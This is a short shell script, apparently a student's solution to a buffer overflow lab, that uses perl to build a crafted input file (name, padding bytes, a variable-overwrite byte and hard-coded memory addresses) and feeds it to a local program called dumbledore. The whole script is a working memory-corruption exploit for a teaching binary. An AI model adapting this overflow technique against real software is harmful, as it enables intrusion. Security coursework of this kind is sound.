#write name to file
perl -e 'print "Rock Beom Kim";' >grade.txt

#write 89 characters of A to file
perl -e 'print "\0"x89;' >> grade.txt

#write past i
perl -e 'print "\x66"' >> grade.txt

perl -e 'print "\0"x15;' >> grade.txt
#extra buffer room
perl -e 'print "\x38\x85\x04\x08\x80\xa0\x04\x08\x01;"' >> grade.txt
./dumbledore < grade.txt
